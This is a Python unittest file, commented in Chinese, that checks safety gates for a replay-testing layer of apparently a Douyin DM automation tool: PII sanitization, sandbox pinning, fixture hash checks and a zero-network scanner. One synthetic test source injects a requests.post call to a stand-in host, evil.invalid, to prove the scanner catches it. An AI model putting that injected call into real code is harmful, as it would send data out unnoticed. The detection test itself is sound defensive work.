# -*- coding: utf-8 -*-
"""回放层「门禁假绿」修复的机械门禁（P0-5/P0-6/P3-1/P3-2/P3-5/P3-9/T5）。

本文件与 `test_replay_capture_parse.py` / `test_replay_conversation_read.py` 并列，
**只验门禁自身会不会拦**（不依赖真机、不依赖大夹具），每条都配「闸门未被改废」
的反向断言（正常输入仍应通过）。

隔离：与既有回放测试同法 —— 不调 `Sandbox.activate()`（防串库），
只在本进程内做纯函数 / 假 store / 合成源库的验证。
"""
import os
import sqlite3
import sys
import tempfile
import unittest

_BACKEND = os.path.dirname(os.path.abspath(__file__))
if _BACKEND not in sys.path:
    sys.path.insert(0, _BACKEND)

# 🔴 2026-10-04 收编（M-31 ③）：setdefault → 显式赋值（抗外部污染 + 抗同进程串扰）。
# 语义变化说明：原 setdefault 尊重进程级已设的 FLOWCAP_APP_ROOT（与套件共享根）；现改为
# 每个文件自己的共享根（flowcap_replay_root）。replay 文件已按 mtime 排序、只读共享，
# 共享语义保留；若套件中他处设了**别的**根，本文件不再跟随（可预期的行为变化，
# 与全库 setdefault 收编方向一致）。
os.environ["FLOWCAP_APP_ROOT"] = os.path.join(tempfile.gettempdir(), "flowcap_replay_root")

from replay import loader, sanitize_db, selftest  # noqa: E402
from services import env_audit  # noqa: E402


# ═══════════════════════════════════════════════════════════════════════════
# P0-6 脱敏：动态表清单 + 默认拒绝 + 产物自证
# ═══════════════════════════════════════════════════════════════════════════
def _make_live_db(path, *, with_cross=True, preview=None):
    con = sqlite3.connect(path)
    con.executescript("""
        CREATE TABLE dm_conversations (id INTEGER PRIMARY KEY AUTOINCREMENT,
          account TEXT, conv_id TEXT, peer_id TEXT, peer_name TEXT, short_id TEXT,
          conv_type INTEGER, last_ts REAL, unread INTEGER, avatar TEXT);
        CREATE TABLE ai_leads (id INTEGER PRIMARY KEY, account TEXT, conv_id TEXT,
          peer_name TEXT, contact_type TEXT, contact_value TEXT, source_text TEXT,
          status TEXT, created_at REAL);
    """)
    if preview is not None:
        con.execute("ALTER TABLE dm_conversations ADD COLUMN last_msg_preview TEXT")
        con.execute("INSERT INTO dm_conversations(account,conv_id,peer_id,peer_name,"
                    "short_id,conv_type,last_ts,unread,avatar,last_msg_preview) VALUES "
                    "('真账号','0:1:111111111111:222222222222','111111111111','Leooo',"
                    "'MS4wLjABAAAA1234567890abcdefghij',1,1.0,0,"
                    "'https://real.douyinpic.com/a.jpg',?)", (preview,))
    else:
        con.execute("INSERT INTO dm_conversations(account,conv_id,peer_id,peer_name,"
                    "short_id,conv_type,last_ts,unread,avatar) VALUES "
                    "('真账号','0:1:111111111111:222222222222','111111111111','Leooo',"
                    "'MS4wLjABAAAA1234567890abcdefghij',1,1.0,0,"
                    "'https://real.douyinpic.com/a.jpg')")
    if with_cross:
        con.execute("CREATE TABLE dm_cross_sink (peer_uid TEXT PRIMARY KEY, "
                    "account_sent TEXT, nickname TEXT, source TEXT, sent_ts REAL, "
                    "cool_until REAL, send_count INTEGER)")
        con.execute("INSERT INTO dm_cross_sink VALUES "
                    "('333333333333','真账号','张三昵称','dispatch',1.0,2.0,1)")
    con.execute("INSERT INTO ai_leads(account,conv_id,peer_name,contact_type,"
                "contact_value,source_text,status,created_at) VALUES "
                "('真账号','0:1:111111111111:222222222222','Leooo','wechat',"
                "'wxvB1W9VN6y','电话 13800138000','new',1.0)")
    con.commit()
    con.close()


class TestSanitizeDefaultDeny(unittest.TestCase):
    """P0-6：漏表/未登记列必须 fail loud；产物必须自证无 PII。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="san_")
        self.src = os.path.join(self.tmp, "live.db")
        _make_live_db(self.src)

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_dynamic_table_list_includes_new_tables(self):
        """动态表清单：dm_cross_sink（含 PII）不得被静默丢弃。"""
        out = os.path.join(self.tmp, "a.db")
        st = sanitize_db.build(self.src, out)
        self.assertIn("dm_cross_sink", st, "新表未被纳入导出（漏表）")
        self.assertEqual(st["dm_cross_sink"], 1, "dm_cross_sink 行数被静默丢弃")

    def test_unknown_table_fails_loud(self):
        """未登记表 → UndocumentedTable（不再 except: continue 静默丢弃）。"""
        saved = dict(sanitize_db._POLICY)
        del sanitize_db._POLICY["dm_cross_sink"]
        try:
            with self.assertRaises(sanitize_db.UndocumentedTable):
                sanitize_db.build(self.src, os.path.join(self.tmp, "b.db"))
        finally:
            sanitize_db._POLICY.clear()
            sanitize_db._POLICY.update(saved)

    def test_unknown_column_fails_loud(self):
        """未登记列 → UndocumentedColumn（不再列名白名单透传）。"""
        _make_live_db(os.path.join(self.tmp, "c.db"), preview="你好 13800138000")
        saved = sanitize_db._POLICY["dm_conversations"].pop("last_msg_preview")
        try:
            with self.assertRaises(sanitize_db.UndocumentedColumn):
                sanitize_db.build(os.path.join(self.tmp, "c.db"),
                                  os.path.join(self.tmp, "c_out.db"))
        finally:
            sanitize_db._POLICY["dm_conversations"]["last_msg_preview"] = saved

    def test_assert_no_pii_catches_leak(self):
        """自证必须抓到残留 PII（防「假自证」）。"""
        out = os.path.join(self.tmp, "d.db")
        sanitize_db.build(self.src, out)
        con = sqlite3.connect(out)
        con.execute("UPDATE dm_conversations SET peer_name='Leooo'")
        con.commit()
        con.close()
        with self.assertRaises(sanitize_db.PiiLeak):
            sanitize_db.assert_no_pii(out, self.src)

    def test_gate_not_weakened_normal_passes(self):
        """反向断言：正常源库必须通过（闸门没被改成无脑全拒）。"""
        out = os.path.join(self.tmp, "e.db")
        st = sanitize_db.build(self.src, out)
        sanitize_db.assert_no_pii(out, self.src)  # 不抛即通过
        self.assertGreaterEqual(st["dm_conversations"], 1)


# ═══════════════════════════════════════════════════════════════════════════
# P0-5 沙箱钉根对「已固化连接」也必须生效
# ═══════════════════════════════════════════════════════════════════════════
class TestSandboxRepinsExistingConnection(unittest.TestCase):
    """P0-5：先建连接再 activate() → get_db() 必须落到沙箱根（不得早退旧根）。

    用**子进程**隔离执行：`Sandbox.activate()` 会改写进程级 `FLOWCAP_APP_ROOT`，
    在同进程内跑会串库（与既有回放测试的硬约束一致）。
    """

    def test_repin_after_connection_exists(self):
        code = (
            "import os, sys;"
            f"sys.path.insert(0, r'{_BACKEND}');"
            "old = os.path.join(os.environ.get('LOCALAPPDATA',''), 'Temp', 'fixC', 'oldroot');"
            "os.makedirs(os.path.join(old, 'data'), exist_ok=True);"
            "os.environ['FLOWCAP_APP_ROOT'] = old;"
            "import database;"
            "p1 = database.get_db().execute('PRAGMA database_list').fetchone()[2];"
            "from replay import sandbox;"
            "sb = sandbox.Sandbox('p05g').activate();"
            "p2 = database.get_db().execute('PRAGMA database_list').fetchone()[2];"
            "import os as _o;"
            "ok = _o.path.normcase(_o.path.abspath(p2)).startswith("
            "       _o.path.normcase(_o.path.abspath(sb.root)));"
            "print('SANDBOX_ROOT_OK', ok);"
            "sb.cleanup()"
        )
        import subprocess
        r = subprocess.run(
            [sys.executable, "-c", code], cwd=_BACKEND,
            env=dict(os.environ), capture_output=True, text=True)
        out = r.stdout + r.stderr
        self.assertIn("SANDBOX_ROOT_OK True", out,
                      f"钉根对已建连接无效（P0-5 回归）:\n{out[-800:]}")
        self.assertEqual(r.returncode, 0, out[-800:])


# ═══════════════════════════════════════════════════════════════════════════
# P3-1 夹具缺失 = hard fail；P3-2 走 sha256 冻结校验
# ═══════════════════════════════════════════════════════════════════════════
class TestFixtureMissingHardFails(unittest.TestCase):
    """P3-1：缺夹具/缺 manifest 一律 raise（不得 SkipTest 静默 exit 0）。"""

    def test_require_fixture_missing_raises(self):
        with selftest._temp_fixture_store():
            loader.write_manifest({})
            with self.assertRaises(loader.FixtureUnavailable):
                loader.require_fixture("__absent__")

    def test_require_fixture_missing_manifest_raises(self):
        with selftest._temp_fixture_store() as tmp:
            # 清单文件不存在
            if os.path.exists(loader._MANIFEST):
                os.remove(loader._MANIFEST)
            with self.assertRaises(loader.FixtureUnavailable):
                loader.require_fixture("anything")

    def test_require_fixture_tampered_raises(self):
        """P3-2 关联：篡改样本经 require_fixture 必须 raise（走 sha 校验）。"""
        with selftest._temp_fixture_store() as tmp:
            rel = "f/f.db"
            p = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "wb") as f:
                f.write(b"REAL-CONTENT")
            loader.write_manifest({"f": {
                "file": rel, "sha256": loader.sha256_of(b"DIFFERENT"),
                "size": 12, "desc": "", "provenance": ""}})
            with self.assertRaises(loader.FixtureTampered):
                loader.require_fixture("f")

    def test_require_fixture_normal_ok(self):
        """反向断言：正常夹具必须放行。"""
        names = loader.list_fixtures()
        self.assertTrue(names, "仓库应有夹具")
        entry = loader.require_fixture(names[0])
        self.assertTrue(entry.get("sha256"))


class TestCopyfileBypassIsClosed(unittest.TestCase):
    """P3-2：截断样本经 copyfile 绕过门禁 vs 经 load_fixture 变红。"""

    def test_truncated_sample_red_via_load_fixture(self):
        with selftest._temp_fixture_store() as tmp:
            rel = "g/g.db"
            p = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            real = b"X" * 1000
            with open(p, "wb") as f:
                f.write(real[:500])                 # 截断样本
            loader.write_manifest({"g": {
                "file": rel, "sha256": loader.sha256_of(real), "size": 1000,
                "desc": "", "provenance": ""}})
            # 旧消费者路径（copyfile）零告警：
            dst = os.path.join(tmp, "copied.db")
            import shutil as _sh
            _sh.copyfile(loader.fixture_path("g"), dst)
            self.assertEqual(os.path.getsize(dst), 500)   # 静默通过
            # 新消费者路径（load_fixture）必须红：
            with self.assertRaises(loader.FixtureTampered):
                loader.load_fixture("g")

    def test_consumer_module_has_no_copyfile_bypass(self):
        """静态门禁：会话读取测试不得再用 fixture_path+copyfile 绕过 sha 校验。"""
        src = open(os.path.join(_BACKEND, "test_replay_conversation_read.py"),
                   encoding="utf-8").read()
        self.assertNotIn("copyfile(loader.fixture_path", src,
                         "消费者仍用 copyfile 绕过 sha256 冻结（P3-2 回归）")
        self.assertIn("load_fixture", src)


# ═══════════════════════════════════════════════════════════════════════════
# P3-5 零网络门禁：扫描范围覆盖真实回放路径
# ═══════════════════════════════════════════════════════════════════════════
class TestZeroNetworkGateScope(unittest.TestCase):
    """P3-5：门禁必须覆盖被回放执行的产品模块，且注网即变红。"""

    def test_scope_covers_consumed_modules(self):
        missing, imported = selftest._scan_replay_scope_coverage()
        self.assertEqual(missing, [], f"回放 import 的模块未纳入扫描范围：{missing}")
        self.assertIn("auto_dm.conversation_capture", imported)
        self.assertIn("api.messages", imported)

    def test_executed_entrypoints_have_no_network(self):
        for mod_name, fn in selftest.REPLAY_EXERCISED_ENTRYPOINTS:
            with self.subTest(entry=f"{mod_name}.{fn}"):
                self.assertEqual(selftest.scan_network_calls(mod_name, funcs=[fn]),
                                 [], f"{mod_name}.{fn} 含网络调用")

    def test_aux_modules_have_no_network(self):
        """🔴 回放期间**被实际执行**的 AUX 模块必须无网络。

        ## 范围（勿扩大）

        只扫「回放用例 setUp 里**真的调用**」的 AUX 模块 —— 即
        `AUX_EXECUTED_IN_REPLAY`。**不可**改成扫全 AUX 集合：
        既有 AUX（如 `daemon.browser_daemon._detect_existing_bcc` → urlopen）
        本就含网络调用，AUX 的语义是「回放辅助、非网络扫描对象」，
        全量扫会把既有基线判红 ⇒ 门禁越界、失去判别力。

        ## 为什么需要这条

        ★ 2026-10-03：P5 拆列后 `test_replay_conversation_read` 在 setUp 里
        跑了一次 `database._migrate_schema`（对齐冻结夹具结构）。若无门禁，
        将来有人往迁移里塞网络调用（写日志/上报/拉配置）会**静默破坏**
        「零网络回放」这一核心保证。range 对账只查「是否登记」，
        不查「是否含网络」⇒ 需要这条。
        """
        for mod_name in sorted(selftest.AUX_EXECUTED_IN_REPLAY_TOP):
            with self.subTest(module=mod_name):
                self.assertEqual(
                    selftest.scan_network_calls(mod_name), [],
                    f"回放期间执行的 AUX 模块 {mod_name} 含网络调用 ⇒ 零网络回放被破坏")

    def test_injecting_requests_turns_gate_red(self):
        """反证：往「被扫模块的入口函数」注入 requests 调用 → 门禁必须变红。

        用**合成源码**（结构与真实模块一致：函数内 import requests）验证门禁
        的判别力 —— 不改真实仓库文件（避免污染 + 缩进脆弱）。
        """
        clean_src = (
            "def parse_init_protobuf(raw, my_uid):\n"
            "    return _measure(raw)\n"
        )
        injected_src = (
            "import requests\n"
            "def parse_init_protobuf(raw, my_uid):\n"
            "    requests.post('http://evil.invalid/x', json={'a': 1})\n"
            "    return _measure(raw)\n"
        )
        gate = "auto_dm.conversation_capture"
        self.assertEqual(
            selftest.scan_network_calls(gate, funcs=["parse_init_protobuf"],
                                        path="synthetic.py", source=clean_src),
            [], "干净入口被误判为有网络调用（门禁过严）")
        hits = selftest.scan_network_calls(
            gate, funcs=["parse_init_protobuf"], path="synthetic.py",
            source=injected_src)
        self.assertNotEqual(hits, [], "注入 requests 调用后门禁未变红（假门禁）")
        self.assertIn("requests.post", hits[0][1])

    def test_module_level_import_scan_still_covers_network_modules(self):
        """replay 包自身的 import 门禁仍在（未被新范围改动废掉）。"""
        hits = selftest._scan_forbidden_imports(
            os.path.dirname(os.path.abspath(selftest.__file__)))
        self.assertEqual(hits, [])


# ═══════════════════════════════════════════════════════════════════════════
# P3-9 manifest expected 是活元数据
# ═══════════════════════════════════════════════════════════════════════════
class TestManifestExpectedConsumed(unittest.TestCase):
    """P3-9：消费者必须读 manifest.expected（由 conversation_read 用例承担实跑对账）。"""

    def test_consumer_reads_manifest_expected(self):
        src = open(os.path.join(_BACKEND, "test_replay_conversation_read.py"),
                   encoding="utf-8").read()
        self.assertIn("TestManifestExpectedIsLive", src)
        self.assertIn('"expected"', src)
        self.assertIn("require_fixture", src)

    def test_manifest_expected_present_for_dm_fixture(self):
        m = loader._read_manifest()
        self.assertIn("dm_read_fixture", m)
        self.assertTrue(m["dm_read_fixture"].get("expected"),
                        "dm_read_fixture 缺 expected 块（判据无来源）")


# ═══════════════════════════════════════════════════════════════════════════
# T5-a / T5-b 浏览器注入门禁
# ═══════════════════════════════════════════════════════════════════════════
class TestInitScriptDisposeGate(unittest.TestCase):
    """T5-a：不得调用不存在的 clear_init_scripts；必须用 disposable.dispose()。"""

    @classmethod
    def setUpClass(cls):
        cls.path = os.path.join(_BACKEND, "daemon", "browser_daemon.py")
        cls.src = open(cls.path, encoding="utf-8").read()
        seg_start = cls.src.find("Camoufox 模式禁止 JS 注入")
        cls.seg = cls.src[seg_start:seg_start + 4000]

    def test_no_clear_init_scripts_call(self):
        """禁止再**调用** clear_init_scripts（AST 判据，注释里的说明不算）。"""
        import ast as _ast
        tree = _ast.parse(self.src, filename=self.path)
        calls = []
        for node in _ast.walk(tree):
            if isinstance(node, _ast.Call):
                f = node.func
                name = f.attr if isinstance(f, _ast.Attribute) else (
                    f.id if isinstance(f, _ast.Name) else None)
                if name == "clear_init_scripts":
                    calls.append(node.lineno)
        self.assertEqual(calls, [],
                         f"仍存在 clear_init_scripts 调用（T5-a 回归），行号={calls}")

    def test_uses_disposable_dispose(self):
        self.assertIn("dispose", self.seg, "未用 disposable.dispose() 清理")

    def test_method_absence_is_asserted(self):
        """不得静默吞：方法/句柄不存在必须显式 raise。"""
        self.assertIn("raise RuntimeError", self.seg)

    def test_clear_init_scripts_really_absent(self):
        """实测补强：确认当前 patchright 的 BrowserContext 无该方法。"""
        from patchright.async_api import BrowserContext
        self.assertFalse(hasattr(BrowserContext, "clear_init_scripts"),
                         "patchright 已支持 clear_init_scripts？清理机制需复核")
        self.assertTrue(hasattr(BrowserContext, "add_init_script"))


class TestTwoWorldVisibilityProbe(unittest.TestCase):
    """T5-b：两世界可见性探针必须真能判「注入成功却读到空」。"""

    def test_both_worlds_visible_ok(self):
        r = env_audit.compare_two_world_visibility(
            {"__CAP_USERINFO__": True, "__CAP_WP_MESSAGE__": True},
            {"__CAP_USERINFO__": True, "__CAP_WP_MESSAGE__": True})
        self.assertTrue(r["ok"])
        self.assertEqual(r["leaks"], [])

    def test_main_only_is_red(self):
        """主世界可见、默认世界读不到 = 注入落进隔离世界 → 必须 red。"""
        r = env_audit.compare_two_world_visibility(
            {"__CAP_WP_MESSAGE__": True}, {})
        self.assertFalse(r["ok"], "跨世界不可见却判通过（假门禁）")
        self.assertTrue(any(x["severity"] == "fatal" for x in r["leaks"]))

    def test_nothing_visible_is_red(self):
        """两世界都看不到 = 注入未执行 → 必须 red。"""
        r = env_audit.compare_two_world_visibility({}, {})
        self.assertFalse(r["ok"])

    def test_probe_js_checks_both_cap_keys(self):
        self.assertIn("__CAP_USERINFO__", env_audit.TWO_WORLD_PROBE_JS)
        self.assertIn("__CAP_WP_MESSAGE__", env_audit.TWO_WORLD_PROBE_JS)


if __name__ == "__main__":
    unittest.main(verbosity=2)
